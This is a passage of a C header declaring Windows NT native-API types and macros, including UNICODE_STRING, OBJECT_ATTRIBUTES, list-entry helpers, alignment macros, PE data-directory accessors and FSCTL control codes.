//
// Arguments:
//
//     DESTINATION_ADDRESS - where to store USHORT value
//     SOURCE_ADDRESS - where to retrieve USHORT value from
//
// Return Value:
//
//     none.
//
//--

#define RtlRetrieveUshort(DEST_ADDRESS,SRC_ADDRESS)                   \
         if ((ULONG_PTR)SRC_ADDRESS & SHORT_MASK) {                       \
             ((PUCHAR) DEST_ADDRESS)[0] = ((PUCHAR) SRC_ADDRESS)[0];  \
             ((PUCHAR) DEST_ADDRESS)[1] = ((PUCHAR) SRC_ADDRESS)[1];  \
         }                                                            \
         else {                                                       \
             *((PUSHORT) DEST_ADDRESS) = *((PUSHORT) SRC_ADDRESS);    \
         }                                                            \

//++
//
// VOID
// RtlRetrieveUlong (
//     PULONG DESTINATION_ADDRESS
//     PULONG SOURCE_ADDRESS
//     )
//
// Routine Description:
//
// This macro retrieves a ULONG value from the SOURCE address, avoiding
// alignment faults.  The DESTINATION address is assumed to be aligned.
//
// Arguments:
//
//     DESTINATION_ADDRESS - where to store ULONG value
//     SOURCE_ADDRESS - where to retrieve ULONG value from
//
// Return Value:
//
//     none.
//
// Note:
//     Depending on the machine, we might want to call retrieveushort in the
//     unaligned case.
//
//--

#define RtlRetrieveUlong(DEST_ADDRESS,SRC_ADDRESS)                    \
         if ((ULONG_PTR)SRC_ADDRESS & LONG_MASK) {                        \
             ((PUCHAR) DEST_ADDRESS)[0] = ((PUCHAR) SRC_ADDRESS)[0];  \
             ((PUCHAR) DEST_ADDRESS)[1] = ((PUCHAR) SRC_ADDRESS)[1];  \
             ((PUCHAR) DEST_ADDRESS)[2] = ((PUCHAR) SRC_ADDRESS)[2];  \
             ((PUCHAR) DEST_ADDRESS)[3] = ((PUCHAR) SRC_ADDRESS)[3];  \
         }                                                            \
         else {                                                       \
             *((PULONG) DEST_ADDRESS) = *((PULONG) SRC_ADDRESS);      \
         }

//++
//
// PCHAR
// RtlOffsetToPointer (
//     PVOID Base,
//     ULONG Offset
//     )
//
// Routine Description:
//
// This macro generates a pointer which points to the byte that is 'Offset'
// bytes beyond 'Base'. This is useful for referencing fields within
// self-relative data structures.
//
// Arguments:
//
//     Base - The address of the base of the structure.
//
//     Offset - An unsigned integer offset of the byte whose address is to
//         be generated.
//
// Return Value:
//
//     A PCHAR pointer to the byte that is 'Offset' bytes beyond 'Base'.
//
//
//--

#define RtlOffsetToPointer(B,O)  ((PCHAR)( ((PCHAR)(B)) + ((ULONG_PTR)(O))  ))


//++
//
// ULONG
// RtlPointerToOffset (
//     PVOID Base,
//     PVOID Pointer
//     )
//
// Routine Description:
//
// This macro calculates the offset from Base to Pointer.  This is useful
// for producing self-relative offsets for structures.
//
// Arguments:
//
//     Base - The address of the base of the structure.
//
//     Pointer - A pointer to a field, presumably within the structure
//         pointed to by Base.  This value must be larger than that specified
//         for Base.
//
// Return Value:
//
//     A ULONG offset from Base to Pointer.
//
//
//--

#define RtlPointerToOffset(B,P)  ((ULONG)( ((PCHAR)(P)) - ((PCHAR)(B))  ))
// 31.05.2011 - end

//
// Data Types -- DOT NOT modify -- modification will break 32bit & 64bit compatibly.
//

typedef char CCHAR;
typedef short CSHORT;
typedef CCHAR *PCCHAR;
typedef CSHORT *PCSHORT;
typedef ULONG CLONG;
typedef ULONG *PCLONG;

typedef ULONG LOGICAL;
typedef ULONG *PLOGICAL;

typedef LONG KPRIORITY;

typedef struct _STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;

typedef struct _CSTRING
{
	USHORT Length;
	USHORT MaximumLength;
	CONST char *Buffer;
} CSTRING;
typedef CSTRING *PCSTRING;
#define ANSI_NULL ((CHAR)0)

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING, **PPUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef struct _STRING32
{
	USHORT Length;
	USHORT MaximumLength;
	ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;
typedef UNICODE_STRING32 *PUNICODE_STRING32;
#define UNICODE_NULL ((WCHAR)0)

typedef STRING32 ANSI_STRING32;
typedef ANSI_STRING32 *PANSI_STRING32;

typedef struct _STRING64
{
	USHORT Length;
	USHORT MaximumLength;
	ULONG_PTR	Buffer;
} STRING64;

typedef STRING64 *PSTRING64;

typedef STRING64 UNICODE_STRING64;
typedef UNICODE_STRING64 *PUNICODE_STRING64;

typedef STRING64 ANSI_STRING64;
typedef ANSI_STRING64 *PANSI_STRING64;

typedef USHORT RTL_ATOM;
typedef RTL_ATOM *PRTL_ATOM;

typedef UCHAR KIRQL;
typedef KIRQL *PKIRQL;

typedef CONST char *PCSZ;

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

#if !defined( _WINNT_ )

typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

#define FIELD_OFFSET(type, field)    ((LONG)&(((type *)0)->field))

#define CONTAINING_RECORD(address, type, field) ((type FAR *)( \
                                          (PCHAR)(address) - \
                                          (PCHAR)(&((type *)0)->field)))
#endif

typedef struct _TRIPLE_LIST_ENTRY
{
	struct _TRIPLE_LIST_ENTRY* Flink[ 3 ];
	struct _TRIPLE_LIST_ENTRY* Blink;
} TRIPLE_LIST_ENTRY, *PTRIPLE_LIST_ENTRY;

#define IN_REGION(x, Base, Size) (((ULONG)x >= (ULONG_PTR)Base) && ((ULONG)x <= (ULONG_PTR)Base + (ULONG)Size))

#ifndef RVATOVA
#define RVATOVA(base, offset) ((PVOID)((ULONG)base + (ULONG)(offset)))
#endif

#ifndef NOP_FUNCTION
#define NOP_FUNCTION (void)0
#endif
#define PAGED_CODE() NOP_FUNCTION;

#if defined(USE_LPC6432)
#define LPC_CLIENT_ID CLIENT_ID64
#define LPC_SIZE_T ULONGLONG
#define LPC_PVOID ULONGLONG
#define LPC_HANDLE ULONGLONG
#else
#define LPC_CLIENT_ID CLIENT_ID
#define LPC_SIZE_T SIZE_T
#define LPC_PVOID PVOID
#define LPC_HANDLE HANDLE
#endif

#define OBJ_INHERIT             0x00000002L
#define OBJ_HANDLE_TAGBITS			0x00000003L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

#define RTL_QUERY_PROCESS_MODULES       0x00000001
#define RTL_QUERY_PROCESS_BACKTRACES    0x00000002
#define RTL_QUERY_PROCESS_HEAP_SUMMARY  0x00000004
#define RTL_QUERY_PROCESS_HEAP_TAGS     0x00000008
#define RTL_QUERY_PROCESS_HEAP_ENTRIES  0x00000010
#define RTL_QUERY_PROCESS_LOCKS         0x00000020
#define RTL_QUERY_PROCESS_MODULES32     0x00000040
#define RTL_QUERY_PROCESS_NONINVASIVE   0x80000000

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;        // SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
	(p)->RootDirectory = r;                             \
	(p)->Attributes = a;                                \
	(p)->ObjectName = n;                                \
	(p)->SecurityDescriptor = s;                        \
	(p)->SecurityQualityOfService = NULL;               \
}

//added 20.12.11
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

#if defined(_WINNT_) && (_MSC_VER < 1300) && !defined(___PROCESSOR_NUMBER_DEFINED)
#define ___PROCESSOR_NUMBER_DEFINED
typedef struct _PROCESSOR_NUMBER {
	WORD Group;
	BYTE Number;
	BYTE Reserved;
} PROCESSOR_NUMBER, *PPROCESSOR_NUMBER;
#endif

#if _WIN32_WINNT >= 0x0501

#define ANSI_NULL ((CHAR)0)     
#define UNICODE_NULL ((WCHAR)0) 

#ifndef UNICODE_STRING_MAX_BYTES
#define UNICODE_STRING_MAX_BYTES ((USHORT) 65534)
#endif

#define UNICODE_STRING_MAX_CHARS (32767)

#define DECLARE_CONST_UNICODE_STRING(_variablename, _string) \
	const WCHAR _variablename ## _buffer[] = _string; \
	const UNICODE_STRING _variablename = { sizeof(_string) - sizeof(WCHAR), sizeof(_string), (PWSTR) _variablename ## _buffer };

#endif // _WIN32_WINNT >= 0x0501

#define IsListEmpty(ListHead) \
	((ListHead)->Flink == (ListHead))

#define InitializeListHead(ListHead) (\
    (ListHead)->Flink = (ListHead)->Blink = (ListHead))

#define IsListEmpty(ListHead) \
    ((ListHead)->Flink == (ListHead))

#define RemoveHeadList(ListHead) \
    (ListHead)->Flink;\
    {RemoveEntryList((ListHead)->Flink)}

#define RemoveTailList(ListHead) \
    (ListHead)->Blink;\
    {RemoveEntryList((ListHead)->Blink)}

// VOID
// RemoveEntryList(
//     IN PLIST_ENTRY Entry
//     );
#define RemoveEntryList(Entry) {\
    PLIST_ENTRY _EX_Blink;\
    PLIST_ENTRY _EX_Flink;\
    _EX_Flink = (Entry)->Flink;\
    _EX_Blink = (Entry)->Blink;\
    _EX_Blink->Flink = _EX_Flink;\
    _EX_Flink->Blink = _EX_Blink;\
    }


// VOID
// InsertTailList(
//     IN PLIST_ENTRY ListHead,
//     IN PLIST_ENTRY Entry
//     );
#define InsertTailList(ListHead,Entry) {\
    PLIST_ENTRY _EX_Blink;\
    PLIST_ENTRY _EX_ListHead;\
    _EX_ListHead = (ListHead);\
    _EX_Blink = _EX_ListHead->Blink;\
    (Entry)->Flink = _EX_ListHead;\
    (Entry)->Blink = _EX_Blink;\
    _EX_Blink->Flink = (Entry);\
    _EX_ListHead->Blink = (Entry);\
    }

// VOID
// InsertHeadList(
//     IN PLIST_ENTRY ListHead,
//     IN PLIST_ENTRY Entry
//     );
#define InsertHeadList(ListHead,Entry) {\
    PLIST_ENTRY _EX_Flink;\
    PLIST_ENTRY _EX_ListHead;\
    _EX_ListHead = (ListHead);\
    _EX_Flink = _EX_ListHead->Flink;\
    (Entry)->Flink = _EX_Flink;\
    (Entry)->Blink = _EX_ListHead;\
    _EX_Flink->Blink = (Entry);\
    _EX_ListHead->Flink = (Entry);\
    }

// BOOL
// COUNT_IS_ALIGNED(
//     IN DWORD Count,
//     IN DWORD Pow2      // undefined if this isn't a power of 2.
//     );
//
#define COUNT_IS_ALIGNED(Count,Pow2) \
        ( ( ( (Count) & (((Pow2)-1)) ) == 0) ? TRUE : FALSE )

// BOOL
// POINTER_IS_ALIGNED(
//     IN LPVOID Ptr,
//     IN DWORD Pow2      // undefined if this isn't a power of 2.
//     );
//
#define POINTER_IS_ALIGNED(Ptr,Pow2) \
        ( ( ( ((DWORD)(Ptr)) & (((Pow2)-1)) ) == 0) ? TRUE : FALSE )


#define ROUND_DOWN_COUNT(Count,Pow2) \
        ( (Count) & (~((Pow2)-1)) )

#define ROUND_DOWN_POINTER(Ptr,Pow2) \
        ( (LPVOID) ROUND_DOWN_COUNT( ((DWORD)(Ptr)), (Pow2) ) )


// If Count is not already aligned, then
// round Count up to an even multiple of "Pow2".  "Pow2" must be a power of 2.
//
// DWORD
// ROUND_UP_COUNT(
//     IN DWORD Count,
//     IN DWORD Pow2
//     );
#define ROUND_UP_COUNT(Count,Pow2) \
        ( ((Count)+(Pow2)-1) & (~((Pow2)-1)) )

// LPVOID
// ROUND_UP_POINTER(
//     IN LPVOID Ptr,
//     IN DWORD Pow2
//     );

// If Ptr is not already aligned, then round it up until it is.
#define ROUND_UP_POINTER(Ptr,Pow2) \
        ( (LPVOID) ( (((DWORD)(Ptr))+(Pow2)-1) & (~((Pow2)-1)) ) )

#define ALIGN_BYTE					1
#define ALIGN_CHAR					1
#define ALIGN_DESC_CHAR			sizeof(DESC_CHAR)
#define ALIGN_DWORD					4
#define ALIGN_LONG					4
#define ALIGN_LPBYTE				4
#define ALIGN_LPDWORD				4
#define ALIGN_LPSTR					4
#define ALIGN_LPTSTR				4
#define ALIGN_LPVOID				4
#define ALIGN_LPWORD				4
#define ALIGN_TCHAR					sizeof(TCHAR)
#define ALIGN_WCHAR					sizeof(WCHAR)
#define ALIGN_WORD					2
#define ALIGN_QUAD					8

#define ALIGN_WORST					8

//03.06.2011 - added
#define QUAD_ALIGN(VALUE) ( ((ULONG)(VALUE) + 7) & ~7 )
//03.06.2011 - end

// Usage: myPtr = ROUND_UP_POINTER(unalignedPtr, ALIGN_DWORD);

// 31.05.2011 - added
#define EXPORT_VA(x)     ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
#define IMPORT_VA(x)     ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
#define RELOC_VA(x)      ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
#define RESOURCE_VA(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress)

#define EXPORT_SIZE(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
#define IMPORT_SIZE(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
#define RELOC_SIZE(x)    ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
#define RESOURCE_SIZE(x) ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size)
#define DEBUGDIR_VA(x)   ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress)
#define DEBUGDIR_SIZE(x) ((x)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size)
// 31.05.2011 - end

#define IS_VALID_HANDLE(hHandle) ((HANDLE)hHandle != (HANDLE)0 && (HANDLE)hHandle != (HANDLE)0xFFFFFFFF)
#define SIZEOF_ARRAY(arr) ( sizeof(arr) / sizeof(arr[0]) )
// 09.06.2011 - begin

//21.12.2011 added
#if !defined(_FILESYSTEMFSCTL_)
#define _FILESYSTEMFSCTL_

#define FSCTL_REQUEST_OPLOCK_LEVEL_1    CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_OPLOCK_LEVEL_2    CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_BATCH_OPLOCK      CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_ACKNOWLEDGE  CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPBATCH_ACK_CLOSE_PENDING CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_NOTIFY       CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  5, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_LOCK_VOLUME               CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  6, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_UNLOCK_VOLUME             CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  7, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DISMOUNT_VOLUME           CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  8, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decommissioned fsctl value                                              9
#define FSCTL_IS_VOLUME_MOUNTED         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 10, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_PATHNAME_VALID         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 11, METHOD_BUFFERED, FILE_ANY_ACCESS) // PATHNAME_BUFFER,
#define FSCTL_MARK_VOLUME_DIRTY         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decommissioned fsctl value                                             13
#define FSCTL_QUERY_RETRIEVAL_POINTERS  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 14,  METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_GET_COMPRESSION           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 15, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SET_COMPRESSION           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 16, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
// decommissioned fsctl value                                             17
// decommissioned fsctl value                                             18
#define FSCTL_SET_BOOTLOADER_ACCESSED   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 19,  METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_ACK_NO_2     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 20, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_INVALIDATE_VOLUMES        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 21, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_FAT_BPB             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 22, METHOD_BUFFERED, FILE_ANY_ACCESS) // FSCTL_QUERY_FAT_BPB_BUFFER
#define FSCTL_REQUEST_FILTER_OPLOCK     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 23, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_FILESYSTEM_GET_STATISTICS CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 24, METHOD_BUFFERED, FILE_ANY_ACCESS) // FILESYSTEM_STATISTICS

#if (_WIN32_WINNT >= 0x0400)
#define FSCTL_GET_NTFS_VOLUME_DATA      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 25, METHOD_BUFFERED, FILE_ANY_ACCESS) // NTFS_VOLUME_DATA_BUFFER
#define FSCTL_GET_NTFS_FILE_RECORD      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 26, METHOD_BUFFERED, FILE_ANY_ACCESS) // NTFS_FILE_RECORD_INPUT_BUFFER, NTFS_FILE_RECORD_OUTPUT_BUFFER
#define FSCTL_GET_VOLUME_BITMAP         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 27,  METHOD_NEITHER, FILE_ANY_ACCESS) // STARTING_LCN_INPUT_BUFFER, VOLUME_BITMAP_BUFFER
#define FSCTL_GET_RETRIEVAL_POINTERS    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 28,  METHOD_NEITHER, FILE_ANY_ACCESS) // STARTING_VCN_INPUT_BUFFER, RETRIEVAL_POINTERS_BUFFER
#define FSCTL_MOVE_FILE                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 29, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // MOVE_FILE_DATA,
#define FSCTL_IS_VOLUME_DIRTY           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 30, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decomissioned fsctl value                                              31
#define FSCTL_ALLOW_EXTENDED_DASD_IO    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 32, METHOD_NEITHER,  FILE_ANY_ACCESS)
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0500)
// decommissioned fsctl value                                             33
// decommissioned fsctl value                                             34
#define FSCTL_FIND_FILES_BY_SID         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 35, METHOD_NEITHER, FILE_ANY_ACCESS)
// decommissioned fsctl value                                             36
// decommissioned fsctl value                                             37
#define FSCTL_SET_OBJECT_ID             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 38, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // FILE_OBJECTID_BUFFER
#define FSCTL_GET_OBJECT_ID             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 39, METHOD_BUFFERED, FILE_ANY_ACCESS) // FILE_OBJECTID_BUFFER
#define FSCTL_DELETE_OBJECT_ID          CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 40, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_REPARSE_POINT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 41, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // REPARSE_DATA_BUFFER,
#define FSCTL_GET_REPARSE_POINT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 42, METHOD_BUFFERED, FILE_ANY_ACCESS) // REPARSE_DATA_BUFFER
#define FSCTL_DELETE_REPARSE_POINT      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 43, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // REPARSE_DATA_BUFFER,
#define FSCTL_ENUM_USN_DATA             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 44,  METHOD_NEITHER, FILE_ANY_ACCESS) // MFT_ENUM_DATA,
#define FSCTL_SECURITY_ID_CHECK         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 45,  METHOD_NEITHER, FILE_READ_DATA)  // BULK_SECURITY_TEST_DATA,
#define FSCTL_READ_USN_JOURNAL          CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 46,  METHOD_NEITHER, FILE_ANY_ACCESS) // READ_USN_JOURNAL_DATA, USN
#define FSCTL_SET_OBJECT_ID_EXTENDED    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 47, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_CREATE_OR_GET_OBJECT_ID   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 48, METHOD_BUFFERED, FILE_ANY_ACCESS) // FILE_OBJECTID_BUFFER
#define FSCTL_SET_SPARSE                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 49, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_ZERO_DATA             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 50, METHOD_BUFFERED, FILE_WRITE_DATA) // FILE_ZERO_DATA_INFORMATION,
#define FSCTL_QUERY_ALLOCATED_RANGES    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 51,  METHOD_NEITHER, FILE_READ_DATA)  // FILE_ALLOCATED_RANGE_BUFFER, FILE_ALLOCATED_RANGE_BUFFER
#define FSCTL_ENABLE_UPGRADE            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 52, METHOD_BUFFERED, FILE_WRITE_DATA)
// decommissioned fsctl value                                             52
#define FSCTL_SET_ENCRYPTION            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 53,  METHOD_NEITHER, FILE_ANY_ACCESS) // ENCRYPTION_BUFFER, DECRYPTION_STATUS_BUFFER
#define FSCTL_ENCRYPTION_FSCTL_IO       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 54,  METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_WRITE_RAW_ENCRYPTED       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 55,  METHOD_NEITHER, FILE_SPECIAL_ACCESS) // ENCRYPTED_DATA_INFO, EXTENDED_ENCRYPTED_DATA_INFO
#define FSCTL_READ_RAW_ENCRYPTED        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 56,  METHOD_NEITHER, FILE_SPECIAL_ACCESS) // REQUEST_RAW_ENCRYPTED_DATA, ENCRYPTED_DATA_INFO, EXTENDED_ENCRYPTED_DATA_INFO
#define FSCTL_CREATE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 57,  METHOD_NEITHER, FILE_ANY_ACCESS) // CREATE_USN_JOURNAL_DATA,
#define FSCTL_READ_FILE_USN_DATA        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 58,  METHOD_NEITHER, FILE_ANY_ACCESS) // Read the Usn Record for a file
#define FSCTL_WRITE_USN_CLOSE_RECORD    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 59,  METHOD_NEITHER, FILE_ANY_ACCESS) // Generate Close Usn Record
#define FSCTL_EXTEND_VOLUME             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 60, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_USN_JOURNAL         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 61, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DELETE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 62, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_MARK_HANDLE               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 63, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SIS_COPYFILE              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 64, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SIS_LINK_FILES            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 65, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
// decommissional fsctl value                                             66
// decommissioned fsctl value                                             67
// decommissioned fsctl value                                             68
#define FSCTL_RECALL_FILE               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 69, METHOD_NEITHER, FILE_ANY_ACCESS)
// decommissioned fsctl value                                             70
#define FSCTL_READ_FROM_PLEX            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 71, METHOD_OUT_DIRECT, FILE_READ_DATA)
#define FSCTL_FILE_PREFETCH             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 72, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // FILE_PREFETCH
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0600)
#define FSCTL_MAKE_MEDIA_COMPATIBLE         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 76, METHOD_BUFFERED, FILE_WRITE_DATA) // UDFS R/W
#define FSCTL_SET_DEFECT_MANAGEMENT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 77, METHOD_BUFFERED, FILE_WRITE_DATA) // UDFS R/W
#define FSCTL_QUERY_SPARING_INFO            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 78, METHOD_BUFFERED, FILE_ANY_ACCESS) // UDFS R/W
#define FSCTL_QUERY_ON_DISK_VOLUME_INFO     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 79, METHOD_BUFFERED, FILE_ANY_ACCESS) // C/UDFS
#define FSCTL_SET_VOLUME_COMPRESSION_STATE  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 80, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // VOLUME_COMPRESSION_STATE
// decommissioned fsctl value                                                 80
#define FSCTL_TXFS_MODIFY_RM                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 81, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_QUERY_RM_INFORMATION     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 82, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
// decommissioned fsctl value                                                 83
#define FSCTL_TXFS_ROLLFORWARD_REDO         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 84, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_ROLLFORWARD_UNDO         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 85, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_START_RM                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 86, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_SHUTDOWN_RM              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 87, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_READ_BACKUP_INFORMATION  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 88, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
#define FSCTL_TXFS_WRITE_BACKUP_INFORMATION CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 89, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_CREATE_SECONDARY_RM      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 90, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
